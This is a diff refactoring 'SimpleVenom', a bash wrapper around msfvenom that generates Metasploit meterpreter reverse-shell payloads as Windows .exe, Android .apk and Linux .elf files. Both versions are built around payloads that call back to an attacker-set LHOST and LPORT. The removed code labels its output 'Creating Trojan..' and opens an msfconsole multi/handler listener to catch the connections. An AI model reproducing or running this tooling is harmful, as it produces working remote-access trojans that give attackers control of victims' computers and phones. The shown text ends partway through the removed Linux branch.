@@ -1,525 +1,442 @@
 #!/bin/bash
 
-###############################
-# a script by ByCh4n&lazypwny #
-###############################
+# SimpleVenom - Metasploit Payload Generator Wrapper
+# Refactored Version
+# Authors: ByCh4n & lazypwny
+# Version: 2.0.0
 
-## variables
+# ----------------------------
+# Configuration & Global Vars
+# ----------------------------
+readonly VERSION="2.0.0"
+# shellcheck disable=SC2155
+readonly DEFAULT_LHOST=$(hostname -I 2>/dev/null | awk '{print $1}')
+readonly DEFAULT_LPORT="4444"
+readonly DEFAULT_NAME="payload"
+# shellcheck disable=SC2155
+readonly CWD=$(pwd)
 
-#Colors
-white="\033[1;37m"
-grey="\033[0;37m"
-purple="\033[0;35m"
-red="\033[1;31m"
-green="\033[1;32m"
-yellow="\033[1;33m"
-purple="\033[0;35m"
-cyan="\033[0;36m"
-cafe="\033[0;33m"
-fiuscha="\033[0;35m"
-blue="\033[1;34m"
-tp="\e[0m"
+# Colors for Shell Mode
+readonly RED='\033[0;31m'
+readonly GREEN='\033[0;32m'
+readonly YELLOW='\033[1;33m'
+readonly BLUE='\033[0;34m'
+readonly NC='\033[0m' # No Color
 
-setdir="$PWD"
-setversion="1.0"
-owner="ByCh4n&LazyPwny"
+# ----------------------------
+# Helper Functions
+# ----------------------------
 
-today=$(date | awk '{print $1,$2,$3,$4"-"$5}')
-thistime=$(date | awk '{$5}')
+log_info() { echo -e "${BLUE}[INFO]${NC} $1"; }
+log_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }
+log_warn() { echo -e "${YELLOW}[WARNING]${NC} $1"; }
+log_error() { echo -e "${RED}[ERROR]${NC} $1"; }
 
-setlhost=$(hostname -I | awk '{print $1}')
-setlport="666"
-setname="venom"
-
-dc="https://discord.io/ByCh4n"
-
-## ARGV
-if [[ $1 =~ ^(-v|-V|--version|--VERSION|version) ]] ; then
-    echo "${setversion} ${owner}"
-    exit 0
-elif [[ $1 =~ ^(-i|-I|--info|--INFO) ]] ; then
-    zenity --info --width=500 --title="SimpleVenom ${setversion} / ${owner}" --text="YouTube: https://www.youtube.com/channel/UCzOK1_NybPfqNb1V4Hjj-iw\nDiscord: ${dc}\nByCh4n: https://github.com/ByCh4n\nLazyPwny: https://github.com/lazypwny751"
-    exit 0
-fi
-## F(x)
-
-function rastgele_renk {
-
-    echo -ne "\e[3$(( $RANDOM * 6 / 32767 + 1 ))m$rengarenk"
-    rengarenk=""
+show_help() {
+    echo -e "${GREEN}SimpleVenom v${VERSION}${NC}"
+    echo "Usage: $0 [OPTIONS]"
+    echo ""
+    echo "Options:"
+    echo "  -g, --gui      Force GUI Mode (uses Zenity)"
+    echo "  -t, --tui      Force TUI Mode (uses Dialog)"
+    echo "  -s, --shell    Force Shell Mode (CLI)"
+    echo "  -v, --version  Show version information"
+    echo "  -h, --help     Show this help message"
+    echo ""
+    echo "If no option is provided, the script attempts to auto-detect"
+    echo "the best available interface (GUI > TUI > Shell)."
 }
 
-function checktool {
-
-    if ! [ -f "${setdir}/requirementtoinstall.sh" ] ; then
-        netcheckSI
-        curl -o "${setdir}/requirementtoinstall.sh" "https://raw.githubusercontent.com/ByCh4n/SimpleVenom/main/requirementtoinstall.sh"
-        if ! [ -f "${setdir}/requirementtoinstall.sh" ] ; then
-            echo -e "Ops Sorry We Can't Found ${red}requirementtoinstall.sh${tp} Pls Reinstall This Tool!"
-            exit 1
-        fi
+check_dependencies() {
+    local missing_deps=0
+    
+    # Essential
+    if ! command -v msfvenom &> /dev/null; then
+        log_error "msfvenom is not installed or not in PATH."
+        missing_deps=1
     fi
 
-    if [[ $(command -v ${1}) != "" ]] ; then
-            echo "${1} Found.."
-    else
-        netcheckSI
-        echo "${1} Can't Found Will Be Install.."
-        pkexec bash "${setdir}/requirementtoinstall.sh" "${1}"
-        if [[ $(command -v ${1}) != "" ]] ; then
-            echo "${1} Is Istalled And Ready To Use.."
-        else
-            echo "some unknown errors occurred, if the problem persists, you can contact us at our discord address.: $dc"
-            exit 1
-        fi
-    fi
-
-    if [[ ${exit2tool} = 1 ]] ; then
+    if [ "$missing_deps" -eq 1 ]; then
+        log_info "Please install Metasploit Framework."
         exit 1
     fi
 }
 
-center() {
-    termwidth="$(tput cols)"
-    padding="$(printf '%0.1s' ={1..500})"
-    printf '%*.*s %s %*.*s\n' 0 "$(((termwidth-2-${#1})/2))" "$padding" "$1" 0 "$(((termwidth-1-${#1})/2))" "$padding"
-    echo -e "$tp"
+# ----------------------------
+# Core Logic (Shared)
+# ----------------------------
+
+generate_payload_cmd() {
+    local platform="$1"
+    local payload="$2"
+    local lhost="$3"
+    local lport="$4"
+    local filename="$5"
+    local extension="$6"
+
+    # Extension Check: If filename already ends with extension, strip it first.
+    if [[ "$filename" == *."$extension" ]]; then
+        filename="${filename%."$extension"}"
+    fi
+
+    local outfile="${CWD}/${filename}.${extension}"
+    
+    # Ensure cleanup before generating new payload
+    if [[ -f "$outfile" ]]; then
+        rm -f "$outfile"
+    fi
+    
+    echo ""
+    log_info "Generating payload..."
+    log_info "Payload: $payload"
+    log_info "LHOST: $lhost | LPORT: $lport"
+    log_info "Output: $outfile"
+
+    if msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" -f "$extension" -o "$outfile"; then
+        if [[ -f "$outfile" ]]; then
+            log_success "Payload created successfully at: $outfile"
+            return 0
+        else
+            log_error "msfvenom exited successfully but the file was not found at: $outfile"
+            return 1
+        fi
+    else
+        log_error "Payload generation failed."
+        return 1
+    fi
 }
 
-banner () {
-    echo "███████╗██╗███╗   ███╗██████╗ ██╗     ███████╗ 
-██╔════╝██║████╗ ████║██╔══██╗██║     ██╔════╝" ;rastgele_renk
-    echo "███████╗██║██╔████╔██║██████╔╝██║     █████╗   
-╚════██║██║██║╚██╔╝██║██╔═══╝ ██║     ██╔══╝" ;rastgele_renk
-    echo "███████║██║██║ ╚═╝ ██║██║     ███████╗███████╗ 
-╚══════╝╚═╝╚═╝     ╚═╝╚═╝     ╚══════╝╚══════╝" ;rastgele_renk
-                                               
-    echo "██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗
-██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║";rastgele_renk
-    echo "██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║
-╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║";rastgele_renk
-    echo -e " ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
-  ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝$tp\n\t\t\t\t${red}--${owner}$tp"
+# ----------------------------
+# Shell Mode
+# ----------------------------
+
+run_shell_mode() {
+    clear
+    echo -e "${YELLOW}SimpleVenom (Shell Mode)${NC}"
+    echo "---------------------------"
+
+    # Platform
+    echo "Select Platform:"
+    echo "1) Windows"
+    echo "2) Android"
+    echo "3) Linux"
+    read -r -p "Choice [1-3]: " p_choice
+
+    case "$p_choice" in
+        1) platform="Windows"; ext="exe" ;;
+        2) platform="Android"; ext="apk" ;;
+        3) platform="Linux"; ext="elf" ;;
+        *) echo "Invalid choice"; exit 1 ;;
+    esac
+
+    # Payload
+    echo -e "\nSelect Payload for $platform:"
+    if [[ "$platform" == "Windows" ]]; then
+        echo "1) windows/meterpreter/reverse_tcp"
+        echo "2) windows/meterpreter/reverse_http"
+        echo "3) windows/meterpreter/reverse_https"
+        echo "4) windows/x64/meterpreter/reverse_tcp"
+        options=("windows/meterpreter/reverse_tcp" "windows/meterpreter/reverse_http" "windows/meterpreter/reverse_https" "windows/x64/meterpreter/reverse_tcp")
+    elif [[ "$platform" == "Android" ]]; then
+        echo "1) android/meterpreter/reverse_tcp"
+        echo "2) android/meterpreter/reverse_http"
+        echo "3) android/meterpreter/reverse_https"
+        options=("android/meterpreter/reverse_tcp" "android/meterpreter/reverse_http" "android/meterpreter/reverse_https")
+    elif [[ "$platform" == "Linux" ]]; then
+        echo "1) linux/x86/meterpreter/reverse_tcp"
+        echo "2) linux/x64/meterpreter/reverse_tcp"
+        echo "3) linux/x64/shell/reverse_tcp"
+        options=("linux/x86/meterpreter/reverse_tcp" "linux/x64/meterpreter/reverse_tcp" "linux/x64/shell/reverse_tcp")
+    fi
+    # shellcheck disable=SC2162
+    read -p "Choice [1-${#options[@]}]: " pay_choice
+    local idx=$((pay_choice-1))
+    local payload="${options[$idx]}"
+
+    if [[ -z "$payload" ]]; then
+        echo "Invalid payload"
+        exit 1
+    fi
+
+    # LHOST
+    # shellcheck disable=SC2162
+    read -p "Enter LHOST [$DEFAULT_LHOST]: " lhost
+    lhost=${lhost:-$DEFAULT_LHOST}
+
+    # LPORT
+    # shellcheck disable=SC2162
+    read -p "Enter LPORT [$DEFAULT_LPORT]: " lport
+    lport=${lport:-$DEFAULT_LPORT}
+
+    # Filename
+    # shellcheck disable=SC2162
+    read -p "Enter Filename (without extension) [$DEFAULT_NAME]: " fname
+    fname=${fname:-$DEFAULT_NAME}
+
+    generate_payload_cmd "$platform" "$payload" "$lhost" "$lport" "$fname" "$ext"
 }
 
-spin1 () {
-    count=0
-    total=$1
-    pstr="[=======================================================================]"
+# ----------------------------
+# Dialog Mode (TUI)
+# ----------------------------
 
-    while [ $count -lt $total ]; do
-        sleep 0.5 # this is work
-        count=$(( $count + 1 ))
-        pd=$(( $count * 73 / $total ))
-        printf "\r%3d.%1d%% %.${pd}s" $(( $count * 100 / $total )) $(( ($count * 1000 / $total) % 10 )) $pstr
+run_dialog_mode() {
+    exec 3>&1
+    
+    # Platform
+    PLATFORM=$(dialog --menu "Select Platform" 12 40 3 \
+        1 "Windows" \
+        2 "Android" \
+        3 "Linux" 2>&1 1>&3)
+    
+    local exit_status=$?
+    if [ $exit_status -ne 0 ]; then exit 0; fi
+
+    case "$PLATFORM" in
+        1) P_NAME="Windows"; EXT="exe"; P_LIST="windows/meterpreter/reverse_tcp 1 windows/meterpreter/reverse_http 2 windows/meterpreter/reverse_https 3 windows/x64/meterpreter/reverse_tcp 4" ;;
+        2) P_NAME="Android"; EXT="apk"; P_LIST="android/meterpreter/reverse_tcp 1 android/meterpreter/reverse_http 2 android/meterpreter/reverse_https 3" ;;
+        3) P_NAME="Linux"; EXT="elf"; P_LIST="linux/x86/meterpreter/reverse_tcp 1 linux/x64/meterpreter/reverse_tcp 2 linux/x64/shell/reverse_tcp 3" ;;
+    esac
+
+    # Payload
+    # shellcheck disable=SC2086
+    PAYLOAD_TAG=$(dialog --menu "Select Payload for $P_NAME" 12 70 4 $P_LIST 2>&1 1>&3)
+    # shellcheck disable=SC2181
+    if [ $? -ne 0 ]; then exit 0; fi
+
+    local PAYLOAD
+    case "$P_NAME" in
+        "Windows") 
+            case "$PAYLOAD_TAG" in
+                1) PAYLOAD="windows/meterpreter/reverse_tcp" ;;
+                2) PAYLOAD="windows/meterpreter/reverse_http" ;;
+                3) PAYLOAD="windows/meterpreter/reverse_https" ;;
+                4) PAYLOAD="windows/x64/meterpreter/reverse_tcp" ;;
+            esac
+            ;;
+        "Android")
+            case "$PAYLOAD_TAG" in
+                1) PAYLOAD="android/meterpreter/reverse_tcp" ;;
+                2) PAYLOAD="android/meterpreter/reverse_http" ;;
+                3) PAYLOAD="android/meterpreter/reverse_https" ;;
+            esac
+            ;;
+        "Linux")
+            case "$PAYLOAD_TAG" in
+                1) PAYLOAD="linux/x86/meterpreter/reverse_tcp" ;;
+                2) PAYLOAD="linux/x64/meterpreter/reverse_tcp" ;;
+                3) PAYLOAD="linux/x64/shell/reverse_tcp" ;;
+            esac
+            ;;
+    esac
+
+    # Settings Form
+    if ! VALUES=$(dialog --form "Payload Settings" 12 50 0 \
+        "LHOST:" 1 1 "$DEFAULT_LHOST" 1 10 20 0 \
+        "LPORT:" 2 1 "$DEFAULT_LPORT" 2 10 20 0 \
+        "Name:"  3 1 "$DEFAULT_NAME"  3 10 20 0 \
+        2>&1 1>&3); then
+        # Cancelled
+        exit 0
+    fi
+    
+    local LHOST
+    local LPORT
+    local FNAME
+    LHOST=$(echo "$VALUES" | sed -n 1p)
+    LPORT=$(echo "$VALUES" | sed -n 2p)
+    FNAME=$(echo "$VALUES" | sed -n 3p)
+
+    clear
+    # Handling generation in Dialog mode:
+    # Use a temp file to capture output
+    local TMP_LOG
+    TMP_LOG=$(mktemp)
+    
+    # Ensure cleanup before generating new payload
+    if [[ -f "${CWD}/${FNAME}.${EXT}" ]]; then
+        rm -f "${CWD}/${FNAME}.${EXT}"
+    fi
+
+    dialog --infobox "Generating payload... This may take a moment." 5 50
+    
+    if msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f "$EXT" -o "${CWD}/${FNAME}.${EXT}" > "$TMP_LOG" 2>&1; then
+        if [[ -f "${CWD}/${FNAME}.${EXT}" ]]; then
+            dialog --title "Success" --msgbox "Payload generated successfully:\n${CWD}/${FNAME}.${EXT}" 8 60
+        else
+             # shellcheck disable=SC2002
+             dialog --title "Error" --msgbox "msfvenom exited 0 but file not found!\n\nDetails:\n$(cat "$TMP_LOG")" 15 60
+        fi
+    else
+        # shellcheck disable=SC2002
+        dialog --title "Error" --msgbox "Payload generation failed!\n\nDetails:\n$(cat "$TMP_LOG")" 15 60
+    fi
+    rm -f "$TMP_LOG"
+    
+    exec 3>&-
+}
+
+# ----------------------------
+# Zenity Mode (GUI)
+# ----------------------------
+
+run_zenity_mode() {
+    # Platform
+    PLATFORM=$(zenity --list --title="SimpleVenom" --text="Select Platform" --column="Platform" \
+        "Windows" "Android" "Linux" --height=250)
+    
+    if [[ -z "$PLATFORM" ]]; then exit 0; fi
+
+    case "$PLATFORM" in
+        "Windows") 
+            EXT="exe"
+            PAYLOAD=$(zenity --list --text="Select Payload" --radiolist --column="Pick" --column="Payload" \
+                TRUE "windows/meterpreter/reverse_tcp" \
+                FALSE "windows/meterpreter/reverse_http" \
+                FALSE "windows/meterpreter/reverse_https" \
+                FALSE "windows/x64/meterpreter/reverse_tcp")
+            ;;
+        "Android") 
+            EXT="apk"
+            PAYLOAD=$(zenity --list --text="Select Payload" --radiolist --column="Pick" --column="Payload" \
+                TRUE "android/meterpreter/reverse_tcp" \
+                FALSE "android/meterpreter/reverse_http" \
+                FALSE "android/meterpreter/reverse_https")
+            ;;
+        "Linux") 
+            EXT="elf"
+            PAYLOAD=$(zenity --list --text="Select Payload" --radiolist --column="Pick" --column="Payload" \
+                TRUE "linux/x86/meterpreter/reverse_tcp" \
+                FALSE "linux/x64/meterpreter/reverse_tcp" \
+                FALSE "linux/x64/shell/reverse_tcp")
+            ;;
+    esac
+
+    if [[ -z "$PAYLOAD" ]]; then exit 0; fi
+
+    # Settings
+    # Zenity forms do NOT support pre-filled values. 
+    # To satisfy the requirement of having values pre-filled in input boxes,
+    # we must switch to sequential "entry" dialogs.
+
+    local LHOST
+    local LPORT
+    local FNAME
+
+    # 1. LHOST
+    if ! LHOST=$(zenity --entry --title="Payload Config (1/3)" --text="Enter LHOST:" --entry-text="$DEFAULT_LHOST"); then exit 0; fi
+    
+    # 2. LPORT
+    if ! LPORT=$(zenity --entry --title="Payload Config (2/3)" --text="Enter LPORT:" --entry-text="$DEFAULT_LPORT"); then exit 0; fi
+
+    # 3. Filename
+    if ! FNAME=$(zenity --entry --title="Payload Config (3/3)" --text="Enter Filename (no extension):" --entry-text="$DEFAULT_NAME"); then exit 0; fi
+
+    # Defaults if empty (just in case user cleared them)
+    LHOST=${LHOST:-$DEFAULT_LHOST}
+    LPORT=${LPORT:-$DEFAULT_LPORT}
+    FNAME=${FNAME:-$DEFAULT_NAME}
+
+    # Progress bar simulation while running
+    (
+        echo "10" ; sleep 0.5
+        echo "# Generating Payload..." 
+        
+        # Ensure cleanup before generating new payload
+        if [ -f "${CWD}/${FNAME}.${EXT}" ]; then
+            rm -f "${CWD}/${FNAME}.${EXT}"
+        fi
+
+        # We need to run the command and check result, but zenity progress reads stdout.
+        # So we run it silently and report based on exit code, but capturing output is tricky in subshell pipe.
+        # Simplified for GUI responsiveness:
+        if msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f "$EXT" -o "${CWD}/${FNAME}.${EXT}" 2>/tmp/msferr; then
+             echo "90"
+             echo "# Done!" ; sleep 1
+        else
+             echo "90"
+             echo "# Error!" ; sleep 1
+        fi
+        echo "100"
+    ) | zenity --progress --title="Generating..." --auto-close
+
+    if [ -f "${CWD}/${FNAME}.${EXT}" ]; then
+        zenity --info --text="Payload Successfully Generated:\n${CWD}/${FNAME}.${EXT}"
+    else
+        local ERR
+        ERR=$(cat /tmp/msferr)
+        zenity --error --text="Payload Generation Failed.\n$ERR"
+    fi
+}
+
+# ----------------------------
+# Main Execution
+# ----------------------------
+
+main() {
+    check_dependencies
+
+    local MODE="auto"
+
+    while [[ $# -gt 0 ]]; do
+        key="$1"
+        case $key in
+            -g|--gui)
+                MODE="gui"
+                shift
+                ;;
+            -t|--tui)
+                MODE="tui"
+                shift
+                ;;
+            -s|--shell)
+                MODE="shell"
+                shift
+                ;;
+            -h|--help)
+                show_help
+                exit 0
+                ;;
+            -v|--version)
+                echo "SimpleVenom version $VERSION"
+                exit 0
+                ;;
+            *)
+                echo "Unknown option: $1"
+                show_help
+                exit 1
+                ;;
+        esac
     done
-        echo ""
-}
 
-function netcheckGUI {
-    wget -q --spider http://google.com
-
-    if [ $? -eq 0 ]; then
-        echo "Online [OK]"
-    else
-        zenity --warning --width=450 --height=50 \
-        --text="This Script Requires Internet Connection to Work!"
-        exit 1
-    fi
-}
-
-function netcheckSI {
-        wget -q --spider http://google.com
-
-    if [ $? -eq 0 ]; then
-        echo "OnLine "
-    else
-        echo "OffLine [-]"
-        exit 1
-    fi
-}
-
-function localip {
-    lhost=$(zenity --entry --title "SimpleVenom $setversion / $owner" --text "Entire Your LocalIP 'Default LocalIP: $setlhost'\n(If You Don't Know Leave Blank)")
-        
-    if [ "$?" != 0 ] ; then
-        echo "thanks for use simplevenom (^-^)"
-        exit 0
-    fi
-
-    if [[ $lhost = "" ]] ; then
-        lhost="$setlhost"
-        echo -e "Set Lhost=> $lhost"
-    elif [[  $lhost != "" ]] ; then
-        re='^[0-9]+([.][0-9]+)+([.][0-9]+)+([.][0-9]+)?$'
-        if ! [[ $lhost =~ $re ]] ; then
-            zenity --error --width=100 --text "There Is Not IP!"
-            lhost="$setlhost"
-            echo -e "Set LocalIP=> $lhost"
+    # Logic to select correct mode
+    if [[ "$MODE" == "gui" ]]; then
+        if command -v zenity &> /dev/null; then
+            run_zenity_mode
         else
-            echo -e "Set LocalIP=> $lhost"
-        fi  
-    fi
-}
-
-function localport {
-    lport=$(zenity --entry --title "SimpleVenom $setversion / $owner" --text "Entire Your LocalPort 'Default LPORT: $setlport' \n(If You Don't Know Leave Blank)")
-
-    if [ "$?" != 0 ] ; then
-        echo "thanks for use simplevenom (^-^)"
-        exit 0
-    fi
-
-    if [[ $lport = "" ]] ; then
-        lport="$setlport"
-        echo -e "Set Lport=> $lport"
-    elif [[ $lport != "" ]] ; then
-        re='^[0-9]+$'
-        if ! [[ $lport =~ $re ]] ; then
-            zenity --error --width=150 --text "There Is Not LPORT!"
-            lport="$setlport"
-            echo -e "Set LocalPort=> $lport\n"
-        elif [[ $lport =~ $re ]] ; then
-            if [ $lport -gt 65535 ] ; then
-                zenity --error --width=150 --text "There Is Not LPORT!"
-                lport="$setlport"
-                echo -e "Set LocalPort=> $lport"
-            else
-                echo -e "Set LocalPort=> $lport"
-            fi
+            log_error "Zenity not installed. Cannot run in GUI mode."
+            exit 1
         fi
-    fi
-
-}
-
-function nameoFile {
-    
-    ne="${1}"
-    
-    namefile=$(zenity --entry --width=300 --title "SimpleVenom $setversion / $owner" --text "Entire Name Of The File 'Default File Name: $setname'\n(If You Don't Know Leave Blank)")
-
-    if [[ "$?" != 0 ]] ; then
-        echo "thanks for use simplevenom (^-^)"
-        exit 0
-    fi
-
-    if [[ $namefile != "" ]] ; then
-        namefile="${namefile}.${ne}"
-        echo -e "Set File Name=> $namefile"
-    elif [[ $namefile = "" ]] ; then
-        namefile="${setname}.${ne}"
-        echo -e "Set File Name=> $namefile"
-    fi    
-}
-
-function quest {
-    if [[ $1 = "" ]] ; then
-        quest="Are You Sure?"
-    elif [[ $1 != "" ]] ; then
-        quest="${1}"
-    fi
-    zenity --question --width 200 --text="${quest}" 
-    if [[ "$?" != 0 ]] ; then
-        zenity --error --width 150 --text="Aborted By User."
-        echo "thanks for use simplevenom (^-^)"
-        exit 0
-    fi
-}
-
-function multihandlermonitor {
-    zenity --question --width 400 --text="Would you like to put the created exploit into listening mode?"
-    if [[ "$?" = 0 ]] ; then
-        echo "Started Msfconsole>Multi/Handler>$payload"
-        xterm -T "Msfconsole Multi/Handler Monitoring Screen" -fa monaco -fs 10 -bg black -e "pkexec msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; exploit'"
-        echo "thanks for use simplevenom (^-^)"
-        exit 0
-    elif [[ "$?" != 0 ]] ; then
-        zenity --info --width 400 --text="Our Discord: ${dc}\nSee Yea.. (￢‿￢)"
-        echo "thanks for use simplevenom (^-^)"
-        exit 0
-    fi
-}
-
-trap ctrl_c INT
-ctrl_c() {
-    echo "Thx For Use SimpleVenom"
-    randend=$(( RANDOM % 3 ))
-    if [[ $randend = "1" ]] ; then
-        echo "> Hosta la vista baby"
-    elif [[ $randend = "2" ]] ; then
-        echo "> Aurevoir Mon Frere (^-^)"
-    elif [[ $randend = "3" ]] ; then
-        echo "> Wir sehen uns"
+    elif [[ "$MODE" == "tui" ]]; then
+        if command -v dialog &> /dev/null; then
+            run_dialog_mode
+        else
+            log_error "Dialog not installed. Cannot run in TUI mode."
+            exit 1
+        fi
+    elif [[ "$MODE" == "shell" ]]; then
+        run_shell_mode
     else
-        echo "> We Are Waiting For You: $dc"
+        # Auto mode
+        if command -v zenity &> /dev/null; then
+            run_zenity_mode
+        elif command -v dialog &> /dev/null; then
+            run_dialog_mode
+        else
+            run_shell_mode
+        fi
     fi
-exit 0
 }
 
-checktool zenity
-checktool msfvenom
-checktool xterm
-
-### main
-
-printf '\033[8;25;90t'
-banner
-center "Log Screen V1 - $today" #payload=$(zenity --width=360 --height=320 --list --title "SimpleVenom $setversion / $owner" --text "Choise a Platform..." --column Platforms "windows/meterpreter/reverse_tcp" "windows/meterpreter/reverse_http" "windows/meterpreter/reverse_tcp_dns")
-echo -e "Set Lhost=> $setlhost\nSet Lport=> $setlport\nSet File Name=> $setname\n"
-while :; do
-
-    choiseplatform=$(zenity --width=360 --height=320 --list --title "SimpleVenom $setversion / $owner" --text "Choise a Platform..." --column Platforms "Windows" "Android" "Linux")
-    center "Set Platform: ${choiseplatform}"
-    if [ "$choiseplatform" = "Windows" ]; then
-        
-        payload=$(zenity --width=360 --height=220 --list --title "SimpleVenom $setversion / $owner" --text "Choise a Payload:" --radiolist --column "Choose" --column "Option" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_tcp_dns")
-
-        if [ "$payload" = "" ] ; then
-            echo "thanks for use simplevenom (^-^)"
-            exit 0
-        fi
-
-        echo -e "Set Payload=> $payload"
-
-        localip
-        localport
-        nameoFile "exe"
-
-        if [[ -f ${setdir}/${namefile} ]] ; then
-            quest "Overwrite ${namefile} file exists in this directory?"
-            (
-            echo "10" ; sleep 0.3
-            echo "# Searching For Payload: ${payload}" ; sleep 0.3 # sadece boş ama hoş :D
-            echo "20" ; sleep 0.3
-            echo "# Preparing To Create File.." ; sleep 0.3 # sadece boş ama hoş :D
-            echo "50" ; sleep 0.3
-            echo "# Creating File To ${setdir}/${namefile}" ; msfvenom -p "${payload}" LHOST="${lhost}" LPORT="${lport}" -f exe -o "${setdir}/${namefile}"
-            echo "75" ; sleep 0.3
-            echo "# Complated Job." ; sleep 0.3 # sadece boş ama hoş :D
-            echo "100" ; sleep 0.3
-            ) |
-            zenity --progress \
-            --width 400 \
-            --title="SimpleVenom $setversion / $owner" \
-            --text="Creating Trojan.." \
-            --percentage=0
-
-            if [ "$?" != 0 ] ; then
-                    zenity --error \
-                    --text="Aborted By User."
-                    echo "Aborted By User Removing File: ${setdir}/${namefile}"
-                    rm "${setdir}/${namefile}"
-                    exit 0
-            fi
-        #####
-        else
-        #####
-            (
-            echo "10" ; sleep 0.3
-            echo "# Searching For Payload: ${payload}" ; sleep 0.3 # sadece boş ama hoş :D
-            echo "20" ; sleep 0.3
-            echo "# Preparing To Create File.." ; sleep 0.3 # sadece boş ama hoş :D
-            echo "50" ; sleep 0.3
-            echo "# Creating File To ${setdir}/${namefile}" ; msfvenom -p "${payload}" LHOST="${lhost}" LPORT="${lport}" -f exe -o "${setdir}/${namefile}"
-            echo "75" ; sleep 0.3
-            echo "# Complated Job." ; sleep 0.3 # sadece boş ama hoş :D
-            echo "100" ; sleep 0.3
-            ) |
-            zenity --progress \
-            --width 400 \
-            --title="SimpleVenom $setversion / $owner" \
-            --text="Creating Trojan.." \
-            --percentage=0
-
-            if [ "$?" != 0 ] ; then
-                    zenity --error \
-                    --text="Aborted By User."
-                    echo "Aborted By User Removing File: ${setdir}/${namefile}"
-                    rm "${setdir}/${namefile}"
-                    exit 0
-            fi
-        fi
-
-        if [[ -f ${setdir}/${namefile} ]] ; then
-            if [[ $(du -k "${setdir}/${namefile}" | cut -f1) = "0" ]] ; then
-                echo "Can not Creating File!"
-                zenity --error --width 220 --text "Cann ot Creating The File!"
-                exit 1
-            else
-                zenity --info --width 300 --title "${setdir}/${namefile}" --text "LHOST: $lhost\nLPORT:$lport\nFILENAME:$namefile"
-                multihandlermonitor
-                exit 0
-            fi
-        fi
-
-    elif [ "$choiseplatform" = "Android" ]; then
-        echo -e "Set Platform=> Android"
-
-        payload=$(zenity --width=360 --height=220 --list --title "SimpleVenom $setversion / $owner" --text "Choise a Payload:" --radiolist --column "Choose" --column "Option" TRUE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_https" FALSE "android/meterpreter/reverse_http")
-
-        if [ "$payload" = "" ] ; then
-            echo "thanks for use simplevenom (^-^)"
-            exit 0
-        fi
-
-        echo -e "Set Payload=> $payload"
-
-        localip
-        localport
-        nameoFile "apk"
-
-        if [[ -f ${setdir}/${namefile} ]] ; then
-            quest "Overwrite ${namefile} file exists in this directory?"
-            (
-            echo "10" ; sleep 0.3
-            echo "# Searching For Payload: ${payload}" ; sleep 0.3 # sadece boş ama hoş :D
-            echo "20" ; sleep 0.3
-            echo "# Preparing To Create File.." ; sleep 0.3 # sadece boş ama hoş :D
-            echo "50" ; sleep 0.3
-            echo "# Creating File To ${setdir}/${namefile}" ; msfvenom -p "${payload}" LHOST="${lhost}" LPORT="${lport}" R -o "${setdir}/${namefile}"
-            echo "75" ; sleep 0.3
-            echo "# Complated Job." ; sleep 0.3 # sadece boş ama hoş :D
-            echo "100" ; sleep 0.3
-            ) |
-            zenity --progress \
-            --width 400 \
-            --title="SimpleVenom $setversion / $owner" \
-            --text="Creating Trojan.." \
-            --percentage=0
-
-            if [ "$?" != 0 ] ; then
-                    zenity --error \
-                    --text="Aborted By User."
-                    echo "Aborted By User Removing File: ${setdir}/${namefile}"
-                    rm "${setdir}/${namefile}"
-                    exit 0
-            fi
-        #####
-        else
-        #####
-            (
-            echo "10" ; sleep 0.3
-            echo "# Searching For Payload: ${payload}" ; sleep 0.3 # sadece boş ama hoş :D
-            echo "20" ; sleep 0.3
-            echo "# Preparing To Create File.." ; sleep 0.3 # sadece boş ama hoş :D
-            echo "50" ; sleep 0.3
-            echo "# Creating File To ${setdir}/${namefile}" ; msfvenom -p "${payload}" LHOST="${lhost}" LPORT="${lport}" R -o "${setdir}/${namefile}"
-            echo "75" ; sleep 0.3
-            echo "# Complated Job." ; sleep 0.3 # sadece boş ama hoş :D
-            echo "100" ; sleep 0.3
-            ) |
-            zenity --progress \
-            --width 400 \
-            --title="SimpleVenom $setversion / $owner" \
-            --text="Creating Trojan.." \
-            --percentage=0
-
-            if [ "$?" != 0 ] ; then
-                    zenity --error \
-                    --text="Aborted By User."
-                    echo "Aborted By User Removing File: ${setdir}/${namefile}"
-                    rm "${setdir}/${namefile}"
-                    exit 0
-            fi
-        fi
-
-        if [[ -f ${setdir}/${namefile} ]] ; then
-            if [[ $(du -k "${setdir}/${namefile}" | cut -f1) = "0" ]] ; then
-                echo "Can not Creating File!"
-                zenity --error --width 220 --text "Cann ot Creating The File!"
-                exit 1
-            else
-                zenity --info --width 300 --title "${setdir}/${namefile}" --text "LHOST: $lhost\nLPORT:$lport\nFILENAME:$namefile"
-                multihandlermonitor
-                exit 0
-            fi
-        fi
-
-    elif [ "$choiseplatform" = "Linux" ]; then
-        echo -e "Set Platform=> Linux"
-
-        payload=$(zenity --width=400 --height=250 --list --title "SimpleVenom $setversion / $owner" --text "Choise a Payload:" --radiolist --column "Choose" --column "Option" TRUE "linux/x86/meterpreter_reverse_tcp" FALSE "linux/x86/meterpreter_reverse_http" FALSE "linux/x86/meterpreter_reverse_https" FALSE "linux/x86/meterpreter/reverse_ipv6_tcp")
-
-        if [ "$payload" = "" ] ; then
-            echo "thanks for use simplevenom (^-^)"
-            exit 0
-        fi
-
-        echo -e "Set Payload=> $payload"
-
-        localip
-        localport
-        nameoFile "bin"
-
-        if [[ -f ${setdir}/${namefile} ]] ; then
-            quest "Overwrite ${namefile} file exists in this directory?"
-            (
-            echo "10" ; sleep 0.3
-            echo "# Searching For Payload: ${payload}" ; sleep 0.3 # sadece boş ama hoş :D
-            echo "20" ; sleep 0.3
-            echo "# Preparing To Create File.." ; sleep 0.3 # sadece boş ama hoş :D
-            echo "50" ; sleep 0.3
